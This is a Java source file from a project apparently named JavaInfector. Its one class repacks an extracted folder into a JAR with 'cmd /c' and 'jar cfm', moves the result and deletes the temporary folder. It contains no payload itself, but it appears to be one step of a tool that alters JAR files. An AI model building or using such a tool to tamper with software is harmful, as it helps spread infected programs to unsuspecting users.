package jlxip.JavaInfector;

import java.io.File;
import java.io.IOException;
import java.util.regex.Pattern;

public class Compress {
	public Compress(File PATH) {
		System.out.print("Re-compressing...");
		
		File[] files = PATH.listFiles();
		String toRun = "cmd /c cd "+Main.DESTDIR+" & jar cfm "+Main.OUTPUT+" META-INF"+File.separator+"MANIFEST.MF ";
		for(int i=0;i<files.length;i++) {
			if(!files[i].equals("META-INF")) {
				toRun = toRun + files[i].getName() + " ";
			}
		}
		Pattern espaces_pattern = Pattern.compile(Pattern.quote(" "));
		String[] espaces = espaces_pattern.split(toRun);
		try {
			Process p = new ProcessBuilder(espaces).start();
			p.waitFor();
			String move_toRun = "cmd /c cd "+Main.DESTDIR+" & move "+Main.OUTPUT+" .."+File.separator;
			String[] move_espaces = espaces_pattern.split(move_toRun);
			Process move_p = new ProcessBuilder(move_espaces).start();
			move_p.waitFor();
			
			removeFolder(PATH);
			System.out.println("Done!");
		} catch (Exception e) {
			System.out.println("FAILED!");
			e.printStackTrace();
		}
	}
	
	public void removeFolder(File PATH) {
		String[] entries = PATH.list();
		for(String s: entries) {
			File currentFile = new File(PATH.getPath(), s);
			if(currentFile.isDirectory()) {
				removeFolder(currentFile);
			} else {
				currentFile.delete();
			}
		}
		PATH.delete();
	}
}
